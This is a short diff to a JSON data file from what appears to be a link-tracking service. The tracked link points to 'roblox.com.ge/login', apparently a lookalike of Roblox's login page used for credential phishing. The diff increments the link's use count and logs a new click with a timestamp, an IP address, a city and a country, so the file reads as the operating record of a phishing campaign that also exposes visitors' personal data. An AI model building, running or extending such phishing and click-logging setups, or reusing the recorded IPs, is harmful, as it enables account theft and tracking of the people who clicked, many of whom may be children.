@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 904,
+    "useCount": 905,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7352,6 +7352,14 @@
         "city": "Lichfield",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777196731489,
+        "ip": "213.194.153.89",
+        "country": "Spain",
+        "city": "Cuevas de San Marcos",
+        "flag": "🇪🇸",
+        "countryCode": "ES"
       }
     ]
   },
